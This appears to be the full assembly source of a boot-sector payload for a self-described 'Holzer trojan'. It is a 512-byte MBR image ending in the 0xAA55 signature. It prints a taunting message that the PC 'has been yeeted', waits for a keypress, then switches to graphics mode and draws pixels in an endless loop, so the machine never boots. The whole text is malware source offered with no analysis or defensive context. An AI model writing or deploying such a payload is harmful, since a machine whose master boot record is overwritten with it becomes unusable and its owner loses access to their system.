bits 16
org 0x7c00

start:
        call clear_screen
        mov ax, cs
        mov ds, ax
        mov si, text

        call print

print:
        push ax
        cld

next:
        mov al, [si]
        cmp al, 0
        je done
        call printchar
        inc si
	cmp al, 0x5D
	je waitf
	hlt
        jmp next
done:
        jmp $

printchar:
        mov ah, 0x0E
        int 0x10
        ret

clear_screen:
        mov ah, 0x07
        mov al, 0x00
        mov bh, 0x0C 
        mov cx, 0x0000 
        mov dx, 0x184F
        int 0x10
        ret
		
waitf:
        mov ah, 0x00
        int 0x16
		
	cli
        push 0x0A000
        pop es
        xor di, di
        xor ax, ax

        mov ax, 0x13
        int 0x10
		
	jmp pixels
		
pixels:
        mov ah, 0x0C
        add al, 1
        mov bh, 0x00
        add cx, 3
        mov dx, 1
        int 0x10

        jmp pixels

text: db "R.I.P", 13, 10, 13, 10, "Your PC has been yeeted by the Holzer trojan.", 13, 10, "Enjoy your new PC! :D", 13, 10, 13, 10, 13, 10, 13, 10, "[ Press any key to continue ", 0x5D
times 510 - ($ - $$) db 0
dw 0xAA55
